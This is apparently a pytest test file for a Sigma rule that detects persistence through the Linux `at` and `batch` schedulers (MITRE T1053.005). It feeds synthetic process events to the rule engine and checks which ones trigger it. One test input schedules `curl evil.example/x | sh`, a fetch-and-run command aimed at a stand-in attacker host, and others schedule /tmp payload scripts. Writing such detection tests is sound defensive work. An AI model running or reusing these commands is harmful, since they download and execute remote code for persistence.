"""Tests for the T1053.005 Scheduled task — `at` command persistence Sigma rule.

Lives in server/rules/builtin/mitre_attack/T1053_at_scheduled_task.yml
and is exercised end-to-end through SigmaRuleRunner.

Covers:
- at 02:30 /tmp/payload.sh                                  → fires
- at now + 1 hour cmd                                       → fires
- batch (queue + bash)                                      → fires
- atq                                                       → fires
- echo payload | at midnight                                → fires (process=at, command=at midnight)
- atd internal write                                        → does NOT fire (filter_legit)
- apt-get install foo                                       → does NOT fire (no at pattern)
- ls -la /tmp/                                              → does NOT fire (unrelated)
"""

from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest

from tests.fake_redis import FakeRedis
from zaqorincore_server.detectors.base import ParsedEvent
from zaqorincore_server.rule_engine.runner import SigmaRuleRunner
from zaqorincore_server.rule_engine.sigma import load_rules_from_dir

RULE_ID = "74cd96e2-4412-5928-bd95-1b4167278c0b"


def _rules() -> list:
    return load_rules_from_dir(Path("rules/builtin/mitre_attack"))


def _find(rules: list):
    return next(r for r in rules if r.id == RULE_ID)


def _event(process: str, command: str, **md) -> ParsedEvent:
    meta = {
        "event_type": "process_create",
        "process": process,
        "command": command,
        "user": "root",
    }
    meta.update(md)
    return ParsedEvent(
        event_id=uuid.uuid4(),
        host_id=uuid.uuid4(),
        source="linux.audit.execve",
        raw="",
        metadata=meta,
        occurred_at=datetime.now(timezone.utc),
    )


@pytest.mark.asyncio
async def test_at_absolute_time_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/at", "at 02:30 < /tmp/payload.sh")
    )
    assert len(fires) == 1
    assert fires[0].rule.id == RULE_ID


@pytest.mark.asyncio
async def test_at_relative_time_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/at", "at now + 1 hour -f /tmp/x.sh")
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_at_midnight_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/bash", "echo 'curl evil.example/x | sh' | at midnight")
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_batch_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/batch", "batch <<< 'cleanup.sh'")
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_atq_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/atq", "atq")
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_atd_internal_does_not_fire() -> None:
    """atd daemon legitimately processes the spool — must be excluded."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/sbin/atd", "atd -f")
    )
    assert fires == []


@pytest.mark.asyncio
async def test_unrelated_process_does_not_fire() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/ls", "ls -la /tmp/")
    )
    assert fires == []